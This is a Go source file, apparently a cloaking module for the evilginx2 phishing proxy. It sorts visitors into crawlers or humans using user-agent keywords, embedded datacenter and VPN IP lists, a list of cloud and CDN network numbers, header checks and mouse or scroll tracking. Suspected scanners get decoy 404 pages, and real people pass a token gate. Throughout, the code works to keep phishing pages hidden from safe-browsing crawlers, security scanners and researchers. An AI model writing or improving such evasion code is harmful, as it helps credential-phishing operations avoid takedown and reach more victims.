package core

import (
	"bufio"
	"bytes"
	"embed"
	"fmt"
	"io"
	"net"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/log"
	"github.com/oschwald/geoip2-golang"
)

//go:embed benign_templates/*.html
var benignTemplates embed.FS

// Datacenter IP lists (X4BNet lists_vpn: VPN + datacenter CIDR ranges,
// ~42k IPv4 + ~8k IPv6 entries, auto-updated upstream).
//go:embed datacenter/datacenter-ipv4.txt
var dcIPv4List []byte

//go:embed datacenter/datacenter-ipv6.txt
var dcIPv6List []byte

// dcRanges holds parsed CIDR ranges keyed by first byte of IP for fast lookup
type dcRanges struct {
	mu     sync.RWMutex
	v4     map[byte]map[string]*net.IPNet // first octet -> set of CIDRs
	v6     map[string]map[string]*net.IPNet // first hextet -> set of CIDRs
	count  int
	loaded bool
}

var globalDCRanges = &dcRanges{}

// loadDatacenterRanges parses the embedded CIDR lists once (lazily).
func loadDatacenterRanges() {
	globalDCRanges.mu.Lock()
	defer globalDCRanges.mu.Unlock()
	if globalDCRanges.loaded {
		return
	}

	globalDCRanges.v4 = make(map[byte]map[string]*net.IPNet)
	globalDCRanges.v6 = make(map[string]map[string]*net.IPNet)
	count := 0

		parse := func(data []byte, isV6 bool) {
		sc := bufio.NewScanner(bytes.NewReader(data))
		for sc.Scan() {
			cidr := strings.TrimSpace(sc.Text())
			if cidr == "" || strings.HasPrefix(cidr, "#") {
				continue
			}
			if !strings.Contains(cidr, "/") {
				cidr += "/32"
			}
			_, network, err := net.ParseCIDR(cidr)
			if err != nil {
				continue
			}
			if isV6 {
				// group by first hextet for fast lookup
				first := strings.Split(cidr, ":")[0]
				if globalDCRanges.v6[first] == nil {
					globalDCRanges.v6[first] = make(map[string]*net.IPNet)
				}
				globalDCRanges.v6[first][cidr] = network
			} else {
				// group by first octet for fast lookup
				_, n, _ := net.ParseCIDR(cidr)
				octet := n.IP[0]
				if globalDCRanges.v4[octet] == nil {
					globalDCRanges.v4[octet] = make(map[string]*net.IPNet)
				}
				globalDCRanges.v4[octet][cidr] = network
			}
			count++
		}
	}

	parse(dcIPv4List, false)
	parse(dcIPv6List, true)

	globalDCRanges.count = count
	globalDCRanges.loaded = true
}

// IsDatacenterIP reports whether ip falls in any known VPN/datacenter CIDR range.
func IsDatacenterIP(ip string) bool {
	parsedIP := net.ParseIP(ip)
	if parsedIP == nil {
		return false
	}
	globalDCRanges.mu.RLock()
	defer globalDCRanges.mu.RUnlock()
	if !globalDCRanges.loaded {
		return false
	}

	if v4 := parsedIP.To4(); v4 != nil {
		if m, ok := globalDCRanges.v4[v4[0]]; ok {
			for _, network := range m {
				if network.Contains(v4) {
					return true
				}
			}
		}
		return false
	}

	// IPv6: group by first hextet
	src := parsedIP.To16()
	first := fmt.Sprintf("%02x", src[0]) + fmt.Sprintf("%02x", src[1])
	if m, ok := globalDCRanges.v6[first]; ok {
		for _, network := range m {
			if network.Contains(parsedIP) {
				return true
			}
		}
	}
	return false
}

// CloakConfig holds configuration for the cloaking proxy
type CloakConfig struct {
	Enabled            bool
	CrawlerASNs        map[string]bool
	CrawlerUASnippets  []string
	BenignResponse     string
	BenignStatusCode   int
	BenignTemplatesDir string // directory with .html templates (embedded)
}

// DefaultCloakConfig returns a sensible default configuration
func DefaultCloakConfig() *CloakConfig {
	return &CloakConfig{
		Enabled:           true,
		BenignResponse:    "404 Not Found",
		BenignStatusCode:  http.StatusNotFound,
		BenignTemplatesDir: "benign_templates",
		CrawlerASNs: map[string]bool{
			"15169":  true, // Google
			"8075":   true, // Microsoft
			"16509":  true, // Amazon
			"13335":  true, // Cloudflare
			"14618":  true, // Amazon
			"396982": true, // Google Cloud
			"36351":  true, // SoftLayer (IBM Cloud)
			"14061":  true, // DigitalOcean
			"63949":  true, // Linode
			"20473":  true, // Choopa/Vultr
			"60068":  true, // CDN77
			"54113":  true, // Fastly
			"54600":  true, // Cloudflare (more)
			"19551":  true, // Incapsula
			"16625":  true, // Akamai
			"20940":  true, // Akamai
			"21342":  true, // Akamai
			"35994":  true, // Akamai
			"36408":  true, // Akamai
			"36733":  true, // Akamai
			"55967":  true, // Azure
			"8068":   true, // Microsoft (more)
			"8069":   true, // Microsoft
			"8070":   true, // Microsoft
			"8071":   true, // Microsoft
		},
		CrawlerUASnippets: []string{
			"HeadlessChrome",
			"Chrome-Lighthouse",
			"Googlebot",
			"bingbot",
			"Slurp",
			"DuckDuckBot",
			"Baiduspider",
			"YandexBot",
			"facebookexternalhit",
			"Twitterbot",
			"LinkedInBot",
			"Slackbot",
			"TelegramBot",
			"WhatsApp",
			"Discordbot",
			"python-requests",
			"curl",
			"wget",
			"Go-http-client",
			"java",
			"okhttp",
			"axios",
			"scrapy",
			"phantomjs",
			"selenium",
			"puppeteer",
			"playwright",
			"webdriver",
			"crawler",
			"spider",
			"bot",
			"scraper",
		},
	}
}

// VisitorProfile tracks behavioral signals per IP
type VisitorProfile struct {
	IP                string
	FirstSeen         time.Time
	RequestCount      int
	HasMouseMove      bool
	HasScroll         bool
	HasKeyPress       bool
	HasClick          bool
	LoadedAssets      bool
	UserAgent         string
	LastSeen          time.Time
	HasInteraction    bool      // any trusted user interaction signal received
	PendingNonce      string    // challenge nonce issued with the gate page
	PendingNonceUntil time.Time // nonce validity window
	HumanToken        string    // cookie token granted after passing the gate
	HumanTokenUntil   time.Time // token validity window
}

// humanCookieName is the browser cookie carrying the human-verification token
const humanCookieName = "__hstid"

type cloakState struct {
	mu               sync.RWMutex
	profiles         map[string]*VisitorProfile
	config           *CloakConfig
	asnDB            ASNLookup // optional MaxMind ASN database
	benignTemplates  []string  // list of benign template names
}

var globalCloak *cloakState

// InitCloak initializes the global cloaking system
func InitCloak(config *CloakConfig) {
	if config == nil {
		config = DefaultCloakConfig()
	}
	
	// Load benign templates from embedded FS
	var templates []string
	if config.BenignTemplatesDir != "" {
		entries, err := benignTemplates.ReadDir(config.BenignTemplatesDir)
		if err == nil {
			for _, entry := range entries {
				if !entry.IsDir() && strings.HasSuffix(entry.Name(), ".html") {
					templates = append(templates, entry.Name())
				}
			}
		}
	}
	
	// Init: eagerly load datacenter ranges so first request isn't slow and
	// IsDatacenterIP works from the very first connection.
	loadDatacenterRanges()

	globalCloak = &cloakState{
		profiles:        make(map[string]*VisitorProfile),
		config:          config,
		benignTemplates: templates,
	}
}

// GetCloak returns the global cloaking instance
func GetCloak() *cloakState {
	if globalCloak == nil {
		InitCloak(nil)
	}
	return globalCloak
}

// SetASNDatabase sets the MaxMind ASN database for IP lookups
func (c *cloakState) SetASNDatabase(db ASNLookup) {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.asnDB = db
}

// ASNLookup interface for MaxMind GeoIP2-ASN
type ASNLookup interface {
	LookupASN(ip net.IP) (uint, string, error)
}

// MaxMindASNLookup implements ASNLookup using MaxMind GeoIP2-ASN database
type MaxMindASNLookup struct {
	db *geoip2.Reader
}

func NewMaxMindASNLookup(dbPath string) (*MaxMindASNLookup, error) {
	db, err := geoip2.Open(dbPath)
	if err != nil {
		return nil, err
	}
	return &MaxMindASNLookup{db: db}, nil
}

func (m *MaxMindASNLookup) LookupASN(ip net.IP) (uint, string, error) {
	record, err := m.db.ASN(ip)
	if err != nil {
		return 0, "", err
	}
	return record.AutonomousSystemNumber, record.AutonomousSystemOrganization, nil
}

func (m *MaxMindASNLookup) Close() error {
	return m.db.Close()
}

// IsCrawler determines if a request is from a known crawler/security scanner
// ip must be the REAL client IP (already extracted from proxy headers)
func (c *cloakState) IsCrawlerWithIP(r *http.Request, ip string) bool {
	if !c.config.Enabled {
		return false
	}

	ua := strings.ToLower(r.UserAgent())

	// 1. UA-based detection (fast, no external deps)
	for _, snippet := range c.config.CrawlerUASnippets {
		if strings.Contains(ua, strings.ToLower(snippet)) {
			return true
		}
	}

	// 2. Datacenter/VPN IP ranges (embedded X4BNet lists — works even without MaxMind)
	if IsDatacenterIP(ip) {
		log.Debug("cloak: blocked datacenter/VPN IP %s", ip)
		return true
	}

	// 3. ASN-based detection (requires MaxMind DB)
	if c.asnDB != nil {
		if asn, _, err := c.asnDB.LookupASN(net.ParseIP(ip)); err == nil {
			asnStr := strconv.FormatUint(uint64(asn), 10)
			if c.config.CrawlerASNs[asnStr] {
				return true
			}
		}
	}

	// 3. Behavioral analysis (requires JS beacon integration)
	// ONLY check EXISTING profiles - DO NOT create new ones during detection
	c.mu.RLock()
	prof, ok := c.profiles[ip]
	c.mu.RUnlock()

	if ok && prof.RequestCount > 1 &&
		time.Since(prof.FirstSeen) < 5*time.Second &&
		!prof.HasMouseMove &&
		!prof.HasScroll &&
		!prof.HasKeyPress &&
		!prof.HasClick &&
		!prof.LoadedAssets {
		return true // Classic crawler pattern: fast, no interaction, no assets
	}

	// 4. Missing Accept-Language (browsers always send this)
	if r.Header.Get("Accept-Language") == "" && isModernUA(ua) {
		return true
	}

	// 5. Suspicious header combinations
	if r.Header.Get("Accept") == "" {
		return true
	}

	// 6. Sec-Fetch headers missing on modern UA
	if isModernUA(ua) && r.Header.Get("Sec-Fetch-Site") == "" {
		return true
	}

	return false
}

// IsCrawler determines if a request is from a known crawler/security scanner
// Uses clientIP() to extract IP from request headers
func (c *cloakState) IsCrawler(r *http.Request) bool {
	ip := clientIP(r)
	return c.IsCrawlerWithIP(r, ip)
}

// RecordBehavior records a behavioral signal from the JS beacon
func (c *cloakState) RecordBehavior(ip, behavior string) {
	c.mu.Lock()
	defer c.mu.Unlock()

	prof, ok := c.profiles[ip]
	if !ok {
		return // profile not initialized yet
	}

	prof.LastSeen = time.Now()
	switch behavior {
	case "mousemove":
		prof.HasMouseMove = true
	case "scroll":
		prof.HasScroll = true
	case "keydown":
		prof.HasKeyPress = true
	case "click":
		prof.HasClick = true
	case "asset":
		prof.LoadedAssets = true
	case "load":
		// page fully loaded
	}
}

// TouchRequest updates the profile for an incoming request (creates if needed).
// Called AFTER the crawler decision so bot handling never creates state.
func (c *cloakState) TouchRequest(ip, ua string) {
	c.mu.Lock()
	defer c.mu.Unlock()
	prof, ok := c.profiles[ip]
	if !ok {
		prof = &VisitorProfile{
			IP:        ip,
			FirstSeen: time.Now(),
			UserAgent: ua,
		}
		c.profiles[ip] = prof
	}
	prof.RequestCount++
	prof.LastSeen = time.Now()
	if ua != "" {
		prof.UserAgent = ua
	}
}

// gateNonceIssue issues a fresh gate nonce for this IP and returns it.
func (c *cloakState) gateNonceIssue(ip string) string {
	nonce := GenRandomString(24)
	c.mu.Lock()
	defer c.mu.Unlock()
	prof := c.getOrCreateProfileLocked(ip)
	prof.PendingNonce = nonce
	prof.PendingNonceUntil = time.Now().Add(5 * time.Minute)
	return nonce
}

// gateNonceVerify checks and consumes the nonce submitted from the gate page.
// Returns true when the nonce is valid and unexpired.
func (c *cloakState) gateNonceVerify(ip, nonce string) bool {
	if nonce == "" {
		return false
	}
	c.mu.Lock()
	defer c.mu.Unlock()
	prof, ok := c.profiles[ip]
	if !ok || prof.PendingNonce == "" {
		return false
	}
	if time.Now().After(prof.PendingNonceUntil) || prof.PendingNonce != nonce {
		return false
	}
	// consume nonce
	prof.PendingNonce = ""
	prof.PendingNonceUntil = time.Time{}
	return true
}

// humanGrant issues a human-verification token for this IP.
func (c *cloakState) humanGrant(ip string) string {
	tok := GenRandomString(32)
	c.mu.Lock()
	defer c.mu.Unlock()
	prof := c.getOrCreateProfileLocked(ip)
	prof.HumanToken = tok
	prof.HumanTokenUntil = time.Now().Add(24 * time.Hour)
	prof.HasInteraction = true
	return tok
}

// humanValid checks the cookie token for this IP.
func (c *cloakState) humanValid(ip, token string) bool {
	if token == "" {
		return false
	}
	c.mu.RLock()
	defer c.mu.RUnlock()
	prof, ok := c.profiles[ip]
	if !ok {
		return false
	}
	return prof.HumanToken == token && time.Now().Before(prof.HumanTokenUntil)
}

// getOrCreateProfileLocked returns the profile for ip, creating it if needed.
// Caller must hold c.mu (write) or use TouchRequest.
func (c *cloakState) getOrCreateProfileLocked(ip string) *VisitorProfile {
	prof, ok := c.profiles[ip]
	if !ok {
		prof = &VisitorProfile{IP: ip, FirstSeen: time.Now(), LastSeen: time.Now()}
		c.profiles[ip] = prof
	}
	return prof
}

// getProfile returns or creates a visitor profile (caller must hold lock for write)
func (c *cloakState) getProfile(ip string) *VisitorProfile {
	c.mu.RLock()
	prof, ok := c.profiles[ip]
	c.mu.RUnlock()

	if ok {
		c.mu.Lock()
		prof.RequestCount++
		prof.LastSeen = time.Now()
		c.mu.Unlock()
		return prof
	}

	c.mu.Lock()
	defer c.mu.Unlock()
	// Double-check after acquiring write lock
	if prof, ok := c.profiles[ip]; ok {
		prof.RequestCount++
		prof.LastSeen = time.Now()
		return prof
	}

	prof = &VisitorProfile{
		IP:           ip,
		FirstSeen:    time.Now(),
		RequestCount: 1,
		UserAgent:    "",
		LastSeen:     time.Now(),
	}
	c.profiles[ip] = prof
	return prof
}

// GetProfile returns a copy of the profile for external inspection
func (c *cloakState) GetProfile(ip string) *VisitorProfile {
	c.mu.RLock()
	defer c.mu.RUnlock()
	if prof, ok := c.profiles[ip]; ok {
		// Return copy to avoid races
		return &VisitorProfile{
			IP:            prof.IP,
			FirstSeen:     prof.FirstSeen,
			RequestCount:  prof.RequestCount,
			HasMouseMove:  prof.HasMouseMove,
			HasScroll:     prof.HasScroll,
			HasKeyPress:   prof.HasKeyPress,
			HasClick:      prof.HasClick,
			LoadedAssets:  prof.LoadedAssets,
			UserAgent:     prof.UserAgent,
			LastSeen:      prof.LastSeen,
		}
	}
	return nil
}

// ServeBenign serves a rotating benign response to detected crawlers
func (c *cloakState) ServeBenign(w http.ResponseWriter, r *http.Request) {
	w.WriteHeader(c.config.BenignStatusCode)
	w.Header().Set("Content-Type", "text/html; charset=utf-8")

	// If we have benign templates, pick one randomly
	if len(c.benignTemplates) > 0 {
		// Simple pseudo-random selection based on request path + time
		idx := (len(r.URL.Path) + int(time.Now().UnixNano())) % len(c.benignTemplates)
		templateName := c.benignTemplates[idx]

		content, err := benignTemplates.ReadFile(c.config.BenignTemplatesDir + "/" + templateName)
		if err == nil {
			w.Write(content)
			return
		}
	}

	// Fallback to plain text
	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
	w.Write([]byte(c.config.BenignResponse))
}

// ServeBenignResponse returns a goproxy response for crawler blocking
func (c *cloakState) ServeBenignResponse(req *http.Request) *http.Response {
	w := &responseRecorder{
		header: make(http.Header),
		body:   &bytes.Buffer{},
	}
	c.ServeBenign(w, req)
	return &http.Response{
		StatusCode:   w.statusCode,
		Header:       w.header,
		Body:         io.NopCloser(w.body),
		ContentLength: int64(w.body.Len()), // REQUIRED: goproxy writes 0 body bytes without it
		Request:      req,
	}
}

type responseRecorder struct {
	statusCode int
	header     http.Header
	body       *bytes.Buffer
}

func (r *responseRecorder) Header() http.Header {
	return r.header
}

func (r *responseRecorder) Write(data []byte) (int, error) {
	return r.body.Write(data)
}

func (r *responseRecorder) WriteHeader(statusCode int) {
	r.statusCode = statusCode
}

// CleanupOldProfiles removes stale profiles (call periodically)
func (c *cloakState) CleanupOldProfiles(maxAge time.Duration) {
	c.mu.Lock()
	defer c.mu.Unlock()
	cutoff := time.Now().Add(-maxAge)
	for ip, prof := range c.profiles {
		if prof.LastSeen.Before(cutoff) {
			delete(c.profiles, ip)
		}
	}
}

// Helper functions

func clientIP(r *http.Request) string {
	// Check common proxy headers first (Cloudflare, load balancers, etc.)
	for _, h := range []string{
		"CF-Connecting-IP",       // Cloudflare
		"True-Client-IP",         // Cloudflare Enterprise
		"X-Real-IP",              // Nginx
		"X-Forwarded-For",        // Standard
		"X-Client-IP",
		"Connecting-IP",
		"Client-IP",
		"X-Proxy-Id",
	} {
		if ip := r.Header.Get(h); ip != "" {
			// X-Forwarded-For can have multiple IPs, take the first (original client)
			ips := strings.Split(ip, ",")
			return strings.TrimSpace(ips[0])
		}
	}
	// Fallback to RemoteAddr
	host, _, _ := net.SplitHostPort(r.RemoteAddr)
	return host
}

func isModernUA(ua string) bool {
	ua = strings.ToLower(ua)
	return strings.Contains(ua, "chrome/") ||
		strings.Contains(ua, "firefox/") ||
		strings.Contains(ua, "safari/") &&
			!strings.Contains(ua, "chrome/") || // Safari but not Chrome
		strings.Contains(ua, "edge/")
}

